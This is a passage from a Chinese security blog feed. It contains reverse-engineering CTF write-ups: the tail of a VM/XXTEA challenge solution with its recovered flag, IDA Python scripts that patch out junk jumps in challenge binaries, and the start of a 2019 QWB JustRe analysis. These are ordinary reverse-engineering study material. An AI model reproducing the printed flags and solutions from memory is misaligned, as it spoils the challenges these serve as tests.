128:</span><br><span class="line">    mov x[r0], r1</span><br><span class="line">mov r0, 0x0</span><br><span class="line">mov rip, r0</span><br><span class="line">mov r1, 0x6</span><br><span class="line">if r1 &lt; 128:</span><br><span class="line">    mov r0, x[r1]</span><br><span class="line">mov r1, 0x7</span><br><span class="line">mul r0, r1</span><br><span class="line">mov r1, 0xf423f</span><br><span class="line">cmp r0, r1</span><br><span class="line">setz r0</span><br><span class="line">mov r1, 0xc36</span><br><span class="line">cmp r0, 0</span><br><span class="line">je r1</span><br><span class="line">.....</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来就只能靠猜的了0.0</p><p>由于又这几句:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov r1, 0x7</span><br><span class="line">mul r0, r1</span><br><span class="line">mov r1, 0xf423f</span><br><span class="line">cmp r0, r1</span><br><span class="line">setz r0</span><br><span class="line">mov r1, 0xc36</span><br><span class="line">cmp r0, 0</span><br><span class="line">je r1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>猜测这里是check, 也就是说有另外一个数(暂时不知道这个数怎么算出来的), 这个数*7 == 0xf423f, 也就是0x22e09。又因为整一个逻辑下来只有一句<code>shl r0, r1</code>, 所以猜测有另外一个二进制数跟在前512的输入之后, 而这个二进制数应该为‭100010111000001001‬(==0x22e09)而且输入应该是大端序, 也就是100100000111010001, 即整个第二部分逻辑大概是</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">input</span> = <span class="string">&quot;100100000111010001&quot;</span></span><br><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">input</span>)):</span><br><span class="line">    <span class="built_in">sum</span> += (<span class="built_in">ord</span>(<span class="built_in">input</span>) - <span class="number">0x30</span>) &lt;&lt; i</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">sum</span>*<span class="number">7</span> == <span class="number">0xf423f</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sucess&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>所以整个输入为前512位输出接上100100000111010001:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="linespan><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到flag:13yR01sw3iy1l1n9</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20190725202207.png" alt="flag"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write up </tag>
            
            <tag> XXTEA </tag>
            
            <tag> VM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA Python</title>
      <link href="/note-tool-ida-python/"/>
      <url>/note-tool-ida-python/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>IDA Python API: <a href="https://www.hex-rays.com/products/ida/support/idapython_docs/">https://www.hex-rays.com/products/ida/support/idapython_docs/</a>, 例子会持续更新补充</p><ul><li>2019.7.25 更新例子: *CTF 2019 Matr1x</li><li>2021.4.17 由于ida7.5的泄露, 这里面的API有更新，详情看<a href="https://www.hex-rays.com/products/ida/support/ida74_idapython_no_bc695_porting_guide.shtml">Porting from IDAPython 6.x-7.3, to 7.4 (hex-rays.com)</a></li></ul><h2 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h2><h3 id="patch-nop"><a href="#patch-nop" class="headerlink" title="patch_nop"></a>patch_nop</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patch_nop</span>(<span class="params">begin, end</span>):</span></span><br><span class="line">    <span class="keyword">while</span>(end&gt;begin):</span><br><span class="line">        patch_byte(begin, <span class="number">0x90</span>)</span><br><span class="line">        begin=begin+<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="patch-jz-jnz"><a href="#patch-jz-jnz" class="headerlink" title="patch jz/jnz"></a>patch jz/jnz</h3><h4 id="7-0"><a href="#7-0" class="headerlink" title="7.0"></a>7.0</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bg = <span class="number">0</span></span><br><span class="line">end = <span class="number">0</span></span><br><span class="line">addr = bg</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patch_nop</span>(<span class="params">begin, end</span>):</span></span><br><span class="line">    <span class="keyword">while</span>(end&gt;begin):</span><br><span class="line">        PatchByte(begin, <span class="number">0x90</span>)</span><br><span class="line">        begin=begin+<span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next_instr</span>(<span class="params">addr</span>):</span></span><br><span class="line">    <span class="keyword">return</span> addr+ItemSize(addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(addr&lt;end):</span><br><span class="line">    <span class="built_in">next</span> =next_instr(addr)</span><br><span class="line">    MakeCode(<span class="built_in">next</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;j&#x27;</span> <span class="keyword">in</span> GetMnem(addr) <span class="keyword">and</span> <span class="string">&#x27;j&#x27;</span> <span class="keyword">in</span> GetMnem(<span class="built_in">next</span>) :</span><br><span class="line">        <span class="keyword">if</span> GetOperandValue(addr, <span class="number">0</span>) == GetOperandValue(<span class="built_in">next</span>, <span class="number">0</span>):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;jmp %08x&#x27;</span>%addr</span><br><span class="line">            dest_addr = GetOperandValue(addr, <span class="number">0</span>)</span><br><span class="line">            patch_nop(addr, dest_addr)</span><br><span class="line">            addr=dest_addr</span><br><span class="line">            MakeCode(addr)</span><br><span class="line">    addr = next_instr(addr)</span><br><span class="line">    MakeCode(addr)</span><br></pre></td></tr></table></figure><h4 id="7-5"><a href="#7-5" class="headerlink" title="7.5"></a>7.5</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bg = <span class="number">0</span></span><br><span class="line">end = <span class="number">0</span></span><br><span class="line">addr = bg</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patch_nop</span>(<span class="params">begin, end</span>):</span></span><br><span class="line">    <span class="keyword">while</span>(end&gt;begin):</span><br><span class="line">        patch_byte(begin, <span class="number">0x90</span>)</span><br><span class="line">        begin=begin+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next_instr</span>(<span class="params">addr</span>):</span></span><br><span class="line">    <span class="keyword">return</span> addr+get_item_size(addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(addr&lt;end):</span><br><span class="line">    <span class="built_in">next</span> =next_instr(addr)</span><br><span class="line">    create_insn(<span class="built_in">next</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;j&#x27;</span> <span class="keyword">in</span> print_insn_mnem(addr) <span class="keyword">and</span> <span class="string">&#x27;j&#x27;</span> <span class="keyword">in</span> print_insn_mnem(<span class="built_in">next</span>) :</span><br><span class="line">        <span class="keyword">if</span> get_operand_value(addr, <span class="number">0</span>) == get_operand_value(<span class="built_in">next</span>, <span class="number">0</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;jmp %08x&#x27;</span>%addr)</span><br><span class="line">            dest_addr = get_operand_value(addr, <span class="number">0</span>)</span><br><span class="line">            patch_nop(addr, dest_addr)</span><br><span class="line">            addr=dest_addr</span><br><span class="line">            create_insn(addr)</span><br><span class="line">    addr = next_instr(addr)</span><br><span class="line">    create_insn(addr)</span><br></pre></td></tr></table></figure><h3 id="get-reg-value"><a href="#get-reg-value" class="headerlink" title="get_reg_value"></a>get_reg_value</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">get_reg_value(<span class="string">&quot;edx&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="get-32bit-get-64bit"><a href="#get-32bit-get-64bit" class="headerlink" title="get_32bit/get_64bit"></a>get_32bit/get_64bit</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ida_bytes.get_32bit(ea)</span><br><span class="line">ida_bytes.get_64bit(ea)</span><br></pre></td></tr></table></figure><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="Xman-2018-re0"><a href="#Xman-2018-re0" class="headerlink" title="Xman-2018-re0"></a>Xman-2018-re0</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line">buf = <span class="built_in">map</span>(<span class="built_in">ord</span>, ida_bytes.get_bytes(<span class="number">0x600B00</span>, <span class="number">182</span>))</span><br><span class="line">buf = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: x ^ <span class="number">0xC</span>, buf)</span><br><span class="line">ida_bytes.patch_bytes(<span class="number">0x600B00</span>, <span class="built_in">str</span>(<span class="built_in">bytearray</span>(buf)))</span><br></pre></td></tr></table></figure><h3 id="KCTF-2019-Q1-第七题"><a href="#KCTF-2019-Q1-第七题" class="headerlink" title="KCTF 2019 Q1 第七题"></a>KCTF 2019 Q1 第七题</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bg = <span class="number">0x00401000</span></span><br><span class="line">end = <span class="number">0x004BBE00</span></span><br><span class="line">addr = bg</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patch_nop</span>(<span class="params">begin, end</span>):</span></span><br><span class="line">    <span class="keyword">while</span>(end&gt;begin):</span><br><span class="line">        PatchByte(begin, <span class="number">0x90</span>)</span><br><span class="line">        begin=begin+<span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next_instr</span>(<span class="params">addr</span>):</span></span><br><span class="line">    <span class="keyword">return</span> addr+ItemSize(addr)</span><br><span class="line"><span class="keyword">while</span>(addr&lt;end):</span><br><span class="line">    <span class="built_in">next</span> =next_instr(addr)</span><br><span class="line">    MakeCode(<span class="built_in">next</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;j&#x27;</span> <span class="keyword">in</span> GetMnem(addr) <span class="keyword">and</span> <span class="string">&#x27;j&#x27;</span> <span class="keyword">in</span> GetMnem(<span class="built_in">next</span>) :</span><br><span class="line">        <span class="keyword">if</span> GetOperandValue(addr, <span class="number">0</span>) == GetOperandValue(<span class="built_in">next</span>, <span class="number">0</span>):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;jmp %08x&#x27;</span>%addr</span><br><span class="line">            dest_addr = GetOperandValue(addr, <span class="number">0</span>)</span><br><span class="line">            patch_nop(addr, dest_addr)</span><br><span class="line">            addr=dest_addr</span><br><span class="line">            MakeCode(addr)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;clc&#x27;</span> == GetMnem(addr) <span class="keyword">and</span> <span class="string">&#x27;jnb&#x27;</span> <span class="keyword">in</span> GetMnem(<span class="built_in">next</span>) :</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;clc %08x&#x27;</span>%addr</span><br><span class="line">            dest_addr = GetOperandValue(<span class="built_in">next</span>, <span class="number">0</span>)</span><br><span class="line">            patch_nop(addr, dest_addr)</span><br><span class="line">            addr=dest_addr</span><br><span class="line">            MakeCode(addr)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;stc&#x27;</span> == GetMnem(addr) <span class="keyword">and</span> <span class="string">&#x27;jb&#x27;</span> <span class="keyword">in</span> GetMnem(<span class="built_in">next</span>) :</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;clc %08x&#x27;</span>%addr</span><br><span class="line">            dest_addr = GetOperandValue(<span class="built_in">next</span>, <span class="number">0</span>)</span><br><span class="line">            patch_nop(addr, dest_addr)</span><br><span class="line">            addr=dest_addr</span><br><span class="line">            MakeCode(addr)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;call&#x27;</span> <span class="keyword">in</span> GetMnem(addr):</span><br><span class="line">        dest_addr = GetOperandValue(addr, <span class="number">0</span>)</span><br><span class="line">        idc.del_items(next_instr(addr))</span><br><span class="line">        MakeCode(dest_addr)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;add     esp, 4&quot;</span> == GetDisasm(dest_addr):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;call %08x&#x27;</span>%addr</span><br><span class="line">            dest_addr=next_instr(dest_addr)</span><br><span class="line">            patch_nop(addr, dest_addr)</span><br><span class="line">            addr=dest_addr</span><br><span class="line">            MakeCode(addr)</span><br><span class="line">    addr = next_instr(addr)</span><br><span class="line">    MakeCode(addr)</span><br></pre></td></tr></table></figure><h3 id="CTF-2019-Matr1x"><a href="#CTF-2019-Matr1x" class="headerlink" title="*CTF 2019 Matr1x"></a>*CTF 2019 Matr1x</h3><p>题目:<a href="https://raw.githubusercontent.com/Alikas0/CTF/master/challenges/StarCTF-2019/Matr1x.zip">Matr1x</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bg = <span class="number">0x00002620</span></span><br><span class="line">end = <span class="number">0x00011320</span></span><br><span class="line">addr = bg</span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patch_nop</span>(<span class="params">begin, end</span>):</span></span><br><span class="line">    <span class="keyword">while</span> end &gt; begin:</span><br><span class="line">        PatchByte(begin, <span class="number">0x90</span>)</span><br><span class="line">        begin += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next_instr</span>(<span class="params">addr</span>):</span></span><br><span class="line">    <span class="keyword">return</span> addr + ItemSize(addr)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patch_global</span>(<span class="params">addr, eax</span>):</span></span><br><span class="line">    flag = GetMnem(addr)</span><br><span class="line">    ebx = GetOperandValue(addr, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="string">&quot;xor&quot;</span>:</span><br><span class="line">        eax ^= ebx</span><br><span class="line">    <span class="keyword">elif</span> flag == <span class="string">&quot;shl&quot;</span>:</span><br><span class="line">        eax &lt;&lt;= ebx</span><br><span class="line">    <span class="keyword">elif</span> flag == <span class="string">&quot;sub&quot;</span>:</span><br><span class="line">        eax -= ebx</span><br><span class="line">    <span class="keyword">elif</span> flag == <span class="string">&quot;add&quot;</span>:</span><br><span class="line">        eax += ebx</span><br><span class="line">    <span class="keyword">elif</span> flag == <span class="string">&quot;and&quot;</span>:</span><br><span class="line">        eax &amp;= ebx</span><br><span class="line">    <span class="keyword">elif</span> flag == <span class="string">&quot;shr&quot;</span>:</span><br><span class="line">        eax &gt;&gt;= ebx</span><br><span class="line">    <span class="keyword">elif</span> flag == <span class="string">&quot;or&quot;</span>:</span><br><span class="line">        eax |= ebx</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> eax &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">OperandValue = [<span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;shr&#x27;</span>, <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;add&#x27;</span>, <span class="string">&#x27;sub&#x27;</span>, <span class="string">&#x27;shl&#x27;</span>, <span class="string">&#x27;xor&#x27;</span>]</span><br><span class="line">Register = [<span class="string">&#x27;ebx&#x27;</span>, <span class="string">&#x27;ecx&#x27;</span>, <span class="string">&#x27;edx&#x27;</span>, <span class="string">&#x27;eax&#x27;</span>]</span><br><span class="line">Patch_jnz = [<span class="string">&#x27;xor&#x27;</span>, <span class="string">&#x27;sub&#x27;</span>]</span><br><span class="line"></span><br><span class="line">dest_addr = <span class="number">0</span></span><br><span class="line">_addr = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> addr &lt; end:</span><br><span class="line">    <span class="built_in">next</span> = next_instr(addr)</span><br><span class="line">    MakeCode(<span class="built_in">next</span>)</span><br><span class="line">    <span class="keyword">if</span> GetMnem(addr) <span class="keyword">in</span> Patch_jnz <span class="keyword">and</span> <span class="string">&#x27;jnz&#x27;</span> <span class="keyword">in</span> GetMnem(<span class="built_in">next</span>):</span><br><span class="line">        <span class="keyword">if</span> GetOperandValue(addr, <span class="number">0</span>) == GetOperandValue(addr, <span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;sucess_patch_jnz: %x&quot;</span> % addr)</span><br><span class="line">            dest_addr = next_instr(<span class="built_in">next</span>)</span><br><span class="line">            patch_nop(<span class="built_in">next</span>, dest_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;call    $+5&quot;</span> == GetDisasm(addr):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;pop     eax&quot;</span> == GetDisasm(<span class="built_in">next</span>):</span><br><span class="line">            dest_addr = addr</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                dest_addr = next_instr(dest_addr)</span><br><span class="line">                MakeCode(dest_addr)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;jmp&quot;</span> <span class="keyword">in</span> GetMnem(dest_addr):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;sucess_patch_call: %x&quot;</span> % addr)</span><br><span class="line">                patch_nop(addr, dest_addr)</span><br><span class="line">                PatchByte(dest_addr, <span class="number">0xE8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xchg&quot;</span> <span class="keyword">in</span> GetMnem(addr):</span><br><span class="line">        <span class="keyword">if</span> GetOperandValue(addr, <span class="number">1</span>) == GetOperandValue(addr, <span class="number">0</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;sucess_patch_xchg: %x&quot;</span> % addr)</span><br><span class="line">            patch_nop(addr, <span class="built_in">next</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;jmp     $+5&quot;</span> == GetDisasm(addr):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;leave&quot;</span> <span class="keyword">in</span> GetMnem(<span class="built_in">next</span>):</span><br><span class="line">            patch_nop(addr, <span class="built_in">next</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;sucess_patch_jmp: %x&quot;</span> % addr)</span><br><span class="line">            <span class="built_in">next</span> = next_instr(<span class="built_in">next</span>)</span><br><span class="line">            addr = <span class="built_in">next</span></span><br><span class="line">            <span class="built_in">next</span> = next_instr(<span class="built_in">next</span>)</span><br><span class="line">            <span class="built_in">next</span> = next_instr(<span class="built_in">next</span>)</span><br><span class="line">            patch_nop(addr, <span class="built_in">next</span>)</span><br><span class="line">            PatchByte(addr, <span class="number">0xC3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;[ebp&quot;</span> <span class="keyword">in</span> GetDisasm(addr) <span class="keyword">and</span> GetOperandValue(addr, <span class="number">1</span>) &gt; <span class="number">0x10000</span> <span class="keyword">and</span> GetOperandValue(addr, <span class="number">1</span>) &lt; (<span class="number">0xFFFFFFFF</span> - <span class="number">0x10000</span>):</span><br><span class="line">        patch_nop(addr, <span class="built_in">next</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;sucess_patch_ebp: %x&quot;</span> % addr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0x0001329C</span> &gt;= GetOperandValue(addr, <span class="number">1</span>) &gt;= <span class="number">0x00013280</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;sucess: %x&quot;</span> % addr)</span><br><span class="line">        eax = Dword(GetOperandValue(addr, <span class="number">1</span>))</span><br><span class="line">        _addr = addr</span><br><span class="line">        Reg = GetOperandValue(addr, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">while</span> GetMnem(<span class="built_in">next</span>) <span class="keyword">in</span> OperandValue:</span><br><span class="line">            eax = patch_global(<span class="built_in">next</span>, eax)</span><br><span class="line">            _addr = <span class="built_in">next</span></span><br><span class="line">            <span class="built_in">next</span> = next_instr(<span class="built_in">next</span>)</span><br><span class="line">            MakeCode(_addr)</span><br><span class="line">            MakeCode(<span class="built_in">next</span>)</span><br><span class="line">            <span class="keyword">if</span> GetOperandValue(_addr, <span class="number">0</span>) != GetOperandValue(<span class="built_in">next</span>, <span class="number">0</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> GetOpnd(<span class="built_in">next</span>, <span class="number">1</span>) <span class="keyword">in</span> Register:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> GetOpnd(_addr, <span class="number">0</span>) == GetOpnd(_addr, <span class="number">1</span>):</span><br><span class="line">            Reg = -<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> Reg != -<span class="number">1</span>:</span><br><span class="line">            addr = next_instr(addr)</span><br><span class="line">            patch_nop(addr, <span class="built_in">next</span>)</span><br><span class="line">        <span class="keyword">if</span> Reg == <span class="number">3</span>:</span><br><span class="line">            PatchByte(addr, <span class="number">0xBB</span>)</span><br><span class="line">            PatchDword(addr + <span class="number">1</span>, eax)</span><br><span class="line">        <span class="keyword">elif</span> Reg == <span class="number">2</span>:</span><br><span class="line">            PatchByte(addr, <span class="number">0xBA</span>)</span><br><span class="line">            PatchDword(addr + <span class="number">1</span>, eax)</span><br><span class="line">        <span class="keyword">elif</span> Reg == <span class="number">1</span>:</span><br><span class="line">            PatchByte(addr, <span class="number">0xB9</span>)</span><br><span class="line">            PatchDword(addr + <span class="number">1</span>, eax)</span><br><span class="line">        <span class="keyword">elif</span> Reg == <span class="number">0</span>:</span><br><span class="line">            PatchByte(addr, <span class="number">0xB8</span>)</span><br><span class="line">            PatchDword(addr + <span class="number">1</span>, eax)</span><br><span class="line">    addr = next_instr(addr)</span><br><span class="line">    MakeCode(addr)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 强网杯</title>
      <link href="/wp-games-2019qwb/"/>
      <url>/wp-games-2019qwb/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>2019强网杯线上赛RE-部分write up</p><p>这算是第一次参加正式比赛并且做出题目, 记录一下！</p><p>虽然只是做出了两道很简单的题目0.0…..</p><p>比赛后在Apeng大佬的帮助下做出了wasm。</p><p>我真的是, 太菜了……..膜拜Apeng大佬！人又帅又会打CTF！</p><ul><li>2019.6.15更新, 上传三道题的原题</li></ul><h2 id="JustRe"><a href="#JustRe" class="headerlink" title="JustRe"></a>JustRe</h2><p>题目:<a href="https://raw.githubusercontent.com/Alikas0/CTF/master/challenges/2019/QWB/JustRe/JustRe.rar">JustRe</a></p><p>打开来是这个样子, 拖进IDA通过字符, 定位到主函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_401BD0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [esp+4h] [ebp-68h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;      #                        ######         &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;      # #    #  ####  #####    #     # ###### &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;      # #    # #        #      #     # #      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;      # #    #  ####    #      ######  #####  &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;#     # #    #      #   #      #   #   #      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;#     # #    # #    #   #      #    #  #      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; #####   ####   ####    #      #     # ###### &quot;</span>);</span><br><span class="line">  sub_401CE0(<span class="string">&quot;%s&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( sub_401610(&amp;v1) )</span><br><span class="line">    sub_4018A0(&amp;v1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;sorry..&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点在函数sub_401610()中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __usercall sub_401610@&lt;eax&gt;(<span class="keyword">int</span> a1@&lt;ecx&gt;, <span class="keyword">int</span> a2@&lt;ebp&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// dh</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v6; <span class="comment">// dl</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v8; <span class="comment">// ecx</span></span><br><span class="line">  __m128i v9; <span class="comment">// xmm5</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// dl</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v11; <span class="comment">// dh</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v12; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// ch</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v14; <span class="comment">// ch</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// dl</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v16; <span class="comment">// dh</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v17; <span class="comment">// esi</span></span><br><span class="line">  __m128i v18; <span class="comment">// xmm0</span></span><br><span class="line">  __m128i v19; <span class="comment">// xmm0</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v20; <span class="comment">// esi</span></span><br><span class="line">  __m128i v21; <span class="comment">// xmm4</span></span><br><span class="line">  <span class="keyword">int</span> v22; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v23; <span class="comment">// rax</span></span><br><span class="line">  HANDLE v24; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v26; <span class="comment">// [esp-54h] [ebp-60h]</span></span><br><span class="line">  __m128i v27; <span class="comment">// [esp-20h] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v28; <span class="comment">// [esp-8h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v29; <span class="comment">// [esp-2h] [ebp-Eh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v30; <span class="comment">// [esp-1h] [ebp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v31; <span class="comment">// [esp+0h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// [esp+4h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> retaddr; <span class="comment">// [esp+Ch] [ebp+0h]</span></span><br><span class="line"></span><br><span class="line">  v31 = a2;</span><br><span class="line">  v32 = retaddr;</span><br><span class="line">  v2 = a1;</span><br><span class="line">  v26 = __rdtsc();</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = *(_BYTE *)(v4 + a1);</span><br><span class="line">    <span class="keyword">if</span> ( v5 &gt;= <span class="number">48</span> &amp;&amp; v5 &lt;= <span class="number">57</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = v5 - <span class="number">65</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">    &#125;</span><br><span class="line">    v6 = v5 - <span class="number">65</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)(v5 - <span class="number">65</span>) &gt; <span class="number">0x19</span>u )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">LABEL_6:</span><br><span class="line">    v3 *= <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)(v5 - <span class="number">48</span>) &lt;= <span class="number">9u</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = v3 - <span class="number">48</span>;</span><br><span class="line">LABEL_10:</span><br><span class="line">      v3 = v5 + v7;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt;= 